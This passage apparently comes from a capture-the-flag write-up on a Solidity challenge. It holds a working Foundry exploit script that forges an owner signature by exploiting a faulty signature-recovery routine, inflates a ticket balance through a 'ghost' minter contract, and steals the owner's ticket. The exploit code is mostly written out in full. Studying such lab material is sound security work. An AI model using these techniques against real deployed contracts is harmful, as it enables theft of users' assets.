+</span></span></code></pre></div></li>
+<li>
+<p><strong>Forge the owner&rsquo;s signature (host):</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// Craft malicious signature components
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">vs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Invalid v triggers ecrecover failure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>  <span class="c1">// Arbitrary r value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ss</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">owner</span><span class="p">)));</span>  <span class="c1">// Owner address as s!
+</span></span></span></code></pre></div></li>
+<li>
+<p><strong>Submit the batch transaction:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">Order</span> <span class="k">memory</span> <span class="n">order</span> <span class="o">=</span> <span class="n">Order</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">:</span> <span class="n">User</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">invited</span><span class="o">:</span> <span class="n">User</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">values</span><span class="o">:</span> <span class="p">[</span><span class="kt">uint256</span><span class="p">(</span><span class="n">nonce</span><span class="p">),</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">ticketId</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">guardian</span><span class="p">.</span><span class="n">batchTransaction</span><span class="p">([</span><span class="n">order</span><span class="p">],</span> <span class="n">rs</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">vs</span><span class="p">);</span>
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>What Happens:</strong></p>
+<ul>
+<li><code>check()</code> calls <code>tryRecover(hostHash, 0, rs[1], owner_as_bytes32)</code></li>
+<li>ecrecover fails (v=0 is invalid)</li>
+<li><code>tryRecover</code> reads from memory offset 0x60, which contains <code>owner_as_bytes32</code></li>
+<li>Returns <code>owner</code> address</li>
+<li>Check passes: <code>owner == order.host.account</code> ✓</li>
+<li>Ticket transfers from owner to player!</li>
+</ul>
+<h2 id="complete-exploit-implementation">Complete Exploit Implementation</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IParty</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balances</span><span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">ownerOf</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">ticketCounter</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">lockedETH</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">tokenId</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">tokenId</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IGuardian</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">startParty</span><span class="p">(</span><span class="kt">address</span> <span class="n">sponsor</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">signature</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">batchTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Order</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">orders</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">rs</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">ss</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">vs</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ISetup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">party</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">IParty</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">guardian</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">IGuardian</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">player</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">struct</span> <span class="nc">User</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">account</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="nb">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">struct</span> <span class="nc">Order</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">host</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">invited</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">values</span><span class="p">;</span>  <span class="c1">// [nonce, ticketId]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Helper contract for ghost balance attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">GhostMinter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IParty</span> <span class="k">public</span> <span class="n">party</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_party</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_player</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">party</span> <span class="o">=</span> <span class="n">IParty</span><span class="p">(</span><span class="n">_party</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">player</span> <span class="o">=</span> <span class="n">_player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Need 1 ETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Buy a ticket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="n">buy</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Get the ticket ID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">ticketId</span> <span class="o">=</span> <span class="n">party</span><span class="p">.</span><span class="n">ticketCounter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Withdraw to get ETH back
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">ticketId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer the ticket to player
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// This creates a &#34;ghost&#34; balance
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="n">ticketId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Return remaining ETH
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">payable</span><span class="p">(</span><span class="n">player</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Solve</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ISetup</span> <span class="k">public</span> <span class="n">setup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IParty</span> <span class="k">public</span> <span class="n">party</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IGuardian</span> <span class="k">public</span> <span class="n">guardian</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">playerKey</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Get setup parameters from environment
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">setupAddr</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;SETUP_ADDRESS&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">playerKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PLAYER_PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">player</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">addr</span><span class="p">(</span><span class="n">playerKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">setup</span> <span class="o">=</span> <span class="n">ISetup</span><span class="p">(</span><span class="n">setupAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">party</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">party</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">guardian</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">guardian</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">owner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;=== Initial State ===&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Owner balance:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">owner</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player balance:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">player</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Locked ETH:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">lockedETH</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">playerKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Phase 1: Unlock Guardian
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">unlockGuardian</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Phase 2: Accumulate Tickets
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">accumulateTickets</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Phase 3: Steal Owner&#39;s Ticket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">stealOwnerTicket</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">=== Final State ===&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Owner balance:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">owner</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player balance:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">player</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Locked ETH:&#34;</span><span class="p">,</span> <span class="n">party</span><span class="p">.</span><span class="n">lockedETH</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Solved:&#34;</span><span class="p">,</span> <span class="n">setup</span><span class="p">.</span><span class="n">isSolved</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">unlockGuardian</span><span class="p">()</span> <span class="k">internal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[Phase 1] Unlocking Guardian...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="n">guardian</span><span class="p">.</span><span class="n">startParty</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;✓ Guardian unlocked successfully&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="n">Error</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">reason</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;✗ Failed to unlock:&#34;</span><span class="p">,</span> <span class="n">reason</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">revert</span><span class="p">(</span><span class="s">&#34;Guardian unlock failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">accumulateTickets</span><span class="p">()</span> <span class="k">internal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[Phase 2] Accumulating Tickets...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">currentBalance</span> <span class="o">=</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">requiredTickets</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">currentBalance</span> <span class="o">&lt;</span> <span class="n">requiredTickets</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Deploy ghost minter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">GhostMinter</span> <span class="n">ghost</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GhostMinter</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">party</span><span class="p">),</span> <span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// Execute attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">ghost</span><span class="p">.</span><span class="n">attack</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">currentBalance</span> <span class="o">=</span> <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Player balance after ghost attack:&#34;</span><span class="p">,</span> <span class="n">currentBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;✓ Accumulated sufficient tickets&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stealOwnerTicket</span><span class="p">()</span> <span class="k">internal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[Phase 3] Stealing Owner&#39;s Ticket...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">owner</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Owner has no tickets to steal&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Find owner&#39;s ticket ID (usually ticket #1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">ownerTicketId</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">party</span><span class="p">.</span><span class="n">ownerOf</span><span class="p">(</span><span class="n">ownerTicketId</span><span class="p">)</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Owner doesn&#39;t own ticket #1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Create order
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Order</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">orders</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Order</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">orders</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Order</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="n">host</span><span class="o">:</span> <span class="n">User</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">invited</span><span class="o">:</span> <span class="n">User</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">values</span><span class="o">:</span> <span class="p">[</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">ownerTicketId</span><span class="p">]</span>  <span class="c1">// nonce=1, ticketId
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Prepare signature arrays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">rs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">ss</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">memory</span> <span class="n">vs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Valid signature for invited (player)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span> <span class="n">invitedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">player</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">owner</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ownerTicketId</span>
+</span></span><span class="line"><span class="cl">        <span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint8</span> <span class="n">vInvited</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">rInvited</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">sInvited</span><span class="p">)</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">playerKey</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">invitedHash</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">vInvited</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">rInvited</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ss</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">sInvited</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Forged signature for host (owner)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Exploit: v=0 causes ecrecover to fail, s contains owner address
